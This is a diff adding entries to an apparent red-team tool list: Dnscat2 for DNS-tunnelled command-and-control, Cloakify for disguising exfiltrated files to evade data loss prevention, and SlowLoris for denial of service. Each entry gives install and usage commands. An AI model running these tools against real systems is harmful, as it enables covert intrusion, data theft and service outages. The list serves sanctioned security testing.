@@ -163,9 +163,11 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Exfiltration</b> $\textcolor{gray}{\text{2 tools}}$</summary>
+    <summary><b>Exfiltration</b> $\textcolor{gray}{\text{4 tools}}$</summary>
     <ul>
         <ul>
+	    <li><b><a href="#dnscat2">Dnscat2</a></b><i> C2 via DNS tunneling</i></li>
+	    <li><b><a href="#cloakify">Cloakify</a></b><i> Data transformation for exfiltration</i></li>
             <li><b><a href="#pyexfil">PyExfil</a></b><i> Data exfiltration PoC</i></li>
             <li><b><a href="#powershell-rat">Powershell RAT</a></b><i> Python based backdoor</i></li>
         </ul>
@@ -173,10 +175,10 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Impact</b> $\textcolor{gray}{\text{0 tools}}$</summary>
+    <summary><b>Impact</b> $\textcolor{gray}{\text{1 tools}}$</summary>
     <ul>
         <ul>
-            <li><b><a href="#">...</a></b><i> ...</i></li>
+            <li><b><a href="#slowloris">SlowLoris</a></b><i> Simple denial of service</i></li>
         </ul>
     </ul>
 </details>
@@ -1431,6 +1433,96 @@ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
 Exfiltration
 ====================
 
+### [🔙](#tool-list)[Dnscat2](https://github.com/iagox86/dnscat2)
+
+A tool for establishing C2 connections via DNS, even if the attacker and victim machines are behind a firewall / network address translation (NAT).
+
+The tool is designed to be stealthy and difficult to detect, as it uses legitimate DNS traffic to transmit data.
+
+**Install: (Compile - Server)** 
+
+```bash
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+gem install bundler
+bundle install
+```
+
+**Install: (Compile - Client)** 
+
+```bash
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/client/
+make
+```
+
+Full installation information can be found in the [Installation Section](https://github.com/iagox86/dnscat2#compiling).
+
+**Usage: (Server)** 
+
+```bash
+# Establish the server
+ruby ./dnscat2.rb DOMAIN.COM
+```
+
+**Usage: (Client)** 
+
+```bash
+# Establish the client with authoritative domain
+./dnscat2 DOMAIN.COM
+
+# Establish the client without authoritative domain
+./dnscat2 --dns host=0.0.0.0,port=0000
+
+# Ping the server from the client
+./dnscat --ping DOMAIN.COM
+
+# Ping the server from the client, with custom dns resolver ip
+./dnscat --dns server=0.0.0.0,domain=DOMAIN.COM --ping
+```
+
+**Usage: (Tunnels)** 
+
+```bash
+# (After establishing the client) You can open a new tunnelled port
+listen [lhost:]lport rhost:rport
+
+# Forward ssh connections through the dnscat2 client to an internal device
+listen 127.0.0.1:2222 10.10.10.10:22
+```
+
+Full usage information can be found in the [Usage Section](https://github.com/iagox86/dnscat2#usage). 
+
+![image](https://user-images.githubusercontent.com/100603074/210116521-0ef905ec-cc14-4cdc-9831-46bbded8c6af.png)
+
+### [🔙](#tool-list)[Cloakify](https://github.com/TryCatchHCF/Cloakify)
+
+When exfiltrating victim files, DLP (Data Loss Prevention) solutions will typically trigger on strings within these files. Cloakify reduces this risk by transforming the data.
+
+Cloakify transforms any filetype (e.g. .zip, .exe, .xls, etc.) into a list of harmless-looking strings. This lets you hide the file in plain sight, and transfer the file without triggering alerts.
+
+**Note:** You can make your own ciphers, see [here](https://github.com/TryCatchHCF/Cloakify#create-your-own-cipers) for more info.
+
+**Install:** 
+
+```bash
+git clone https://github.com/TryCatchHCF/Cloakify
+```
+
+**Usage:** 
+
+```bash
+# Cloakify some text
+python3 cloakify.py TEXT.txt ciphers/desserts.ciph > TEXT.cloaked
+
+# De-Cloakify the text
+python3 decloakify.py TEXT.cloaked ciphers/desserts.ciph
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210117067-4611a42a-2ac7-44af-8aee-2e448c05909b.png)
+
+![image](https://user-images.githubusercontent.com/100603074/210116996-8ec36a12-8eef-44e9-924a-ad179e599910.png)
+
 ### [🔙](#tool-list)[PyExfil](https://github.com/ytisf/PyExfil)
 
 "An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios."
@@ -1507,4 +1599,33 @@ git clone https://github.com/Viralmaniar/Powershell-RAT
 Impact
 ====================
 
-### [🔙](#tool-list)...
+### [🔙](#tool-list)[SlowLoris](https://github.com/gkbrk/slowloris)
+
+Slowloris is a type of denial-of-service (DoS) attack that involves sending HTTP requests to a web server in a way that ties up the server's resources, preventing it from being able to process legitimate requests. 
+
+This attack would typically be conducted with a botnet, it is designed to be difficult to detect and mitigate, as it uses a relatively small number of connections and does not generate a large amount of traffic.
+
+**Install: (Pip)** 
+
+```bash
+sudo pip3 install slowloris
+```
+
+**Install: (Git)** 
+
+```bash
+git clone https://github.com/gkbrk/slowloris.git
+cd slowloris
+```
+
+**Usage:** 
+
+```bash
+# Pip
+slowloris example.com
+
+# Git
+python3 slowloris.py example.com
+```
+
+![image](https://user-images.githubusercontent.com/100603074/210115630-b6541ee0-ad82-471a-9a7e-7f0ec028c67d.png)
